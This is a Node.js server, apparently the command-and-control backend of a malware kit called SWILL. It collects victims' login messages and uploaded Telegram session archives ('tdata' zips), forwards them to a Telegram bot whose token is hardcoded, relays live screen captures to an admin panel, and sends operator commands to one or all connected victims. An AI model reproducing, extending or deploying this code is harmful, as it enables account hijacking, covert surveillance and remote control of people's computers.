const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const https = require('https');
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

const ADMIN_TOKEN   = 'admin123';
const CLIENT_SECRET = 'my_secret_key';

// ТВОЙ ТОКЕН ИЗ BOTFATHER
const TG_TOKEN  = '8795774121:AAF49EBYh6V3rS0FLc2QgPXdnqtqZ6ymyHI';
// ВВОДИМ ЧЕРЕЗ САЙТ
let TG_CHATID = ''; 

const clients = new Map();
const tgChunks = new Map();

app.use(express.json());
app.use(express.static('public'));

app.post('/api/set-tg', (req, res) => {
  const { chatId } = req.body;
  if (chatId && chatId.length > 3) {
    TG_CHATID = chatId;
    return res.json({ success: true });
  }
  res.status(400).json({ success: false });
});

function sendToTelegram(text) {
  if (!TG_CHATID) return;
  const data = JSON.stringify({ chat_id: TG_CHATID, text: text, parse_mode: 'HTML' });
  const req = https.request({
    hostname: 'api.telegram.org', path: `/bot${TG_TOKEN}/sendMessage`,
    method: 'POST', headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(data) }
  }, res => res.on('data', () => {}));
  req.on('error', e => console.log('[TG] error:', e.message));
  req.write(data); req.end();
}

function sendDocumentToTelegram(filePath, caption) {
  if (!TG_CHATID) return;
  const data = fs.readFileSync(filePath);
  const boundary = '----SWILL' + Date.now();
  const head = Buffer.from(
    `--${boundary}\r\nContent-Disposition: form-data; name="chat_id"\r\n\r\n${TG_CHATID}\r\n` +
    `--${boundary}\r\nContent-Disposition: form-data; name="caption"\r\n\r\n${caption}\r\n` +
    `--${boundary}\r\nContent-Disposition: form-data; name="document"; filename="${filePath.split(/[\\/]/).pop()}"\r\nContent-Type: application/octet-stream\r\n\r\n`
  );
  const tail = Buffer.from(`\r\n--${boundary}--\r\n`);
  const body = Buffer.concat([head, data, tail]);
  const req = https.request({
    hostname: 'api.telegram.org', path: `/bot${TG_TOKEN}/sendDocument`,
    method: 'POST', headers: { 'Content-Type': `multipart/form-data; boundary=${boundary}`, 'Content-Length': body.length }
  }, res => res.on('data', () => {}));
  req.on('error', e => console.log('[TG] doc error', e.message));
  req.write(body); req.end();
}

wss.on('connection', (ws, req) => {
  const url = new URL(req.url, 'http://x');
  const clientId = url.searchParams.get('clientId');
  const token    = url.searchParams.get('token');
  if (!clientId || token !== CLIENT_SECRET) { ws.close(); return; }

  clients.set(clientId, ws);
  console.log(`[+] ${clientId} connected`);

  ws.on('message', (raw) => {
    try {
      const msg = JSON.parse(raw.toString());
      
      if (msg.type === 'chat' && typeof msg.text === 'string') {
        if (/(login|reg|register|^\/l\s|^\/log\s|^\/l$)/i.test(msg.text)) {
          sendToTelegram(`🔐 <b>${clientId}</b>\n<code>${escapeHtml(msg.text)}</code>`);
        }
      }
      if (msg.type === 'tg_chunk') {
        if (!tgChunks.has(clientId)) tgChunks.set(clientId, { parts: [], total: msg.total });
        tgChunks.get(clientId).parts[msg.index] = msg.data;
      }
      if (msg.type === 'tg_chunk_end') {
        const entry = tgChunks.get(clientId);
        if (entry) {
            const buf = Buffer.from(entry.parts.join(''), 'base64');
            const path = `./tdata_${clientId}_${Date.now()}.zip`;
            fs.writeFileSync(path, buf);
            sendDocumentToTelegram(path, `📦 Данные от ${clientId}`);
            tgChunks.delete(clientId);
        }
      }
      if (msg.type === 'screen_frame') {
        for (const p of panelWss.clients) if (p.readyState === 1) p.send(raw.toString());
      }
    } catch (e) {}
  });

  ws.on('close', () => { clients.delete(clientId); });
});

const panelWss = new WebSocket.Server({ noServer: true });
server.on('upgrade', (req, sock, head) => {
  const url = new URL(req.url, 'http://x');
  if (url.pathname === '/panel') {
    if (url.searchParams.get('token') !== ADMIN_TOKEN) { sock.destroy(); return; }
    panelWss.handleUpgrade(req, sock, head, ws => {
      ws.on('message', raw => {
        try {
          const msg = JSON.parse(raw.toString());
          const target = clients.get(msg.clientId);
          if (target) target.send(JSON.stringify(msg.payload));
        } catch (e) {}
      });
    });
  }
});

app.get('/api/clients', (req, res) => {
  if (req.headers['x-admin-token'] !== ADMIN_TOKEN) return res.sendStatus(403);
  res.json([...clients.keys()]);
});

app.post('/api/command', (req, res) => {
  if (req.headers['x-admin-token'] !== ADMIN_TOKEN) return res.sendStatus(403);
  const { clientId, command } = req.body;
  const targets = clientId === 'ALL' ? [...clients.values()] : [clients.get(clientId)].filter(Boolean);
  targets.forEach(ws => { if (ws.readyState === 1) ws.send(JSON.stringify({ type: 'command', command })); });
  res.json({ success: true, sent: targets.length });
});

function escapeHtml(s) { return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }

server.listen(process.env.PORT || 8080, () => {
  console.log(`SWILL backend on ${process.env.PORT || 8080}`);
});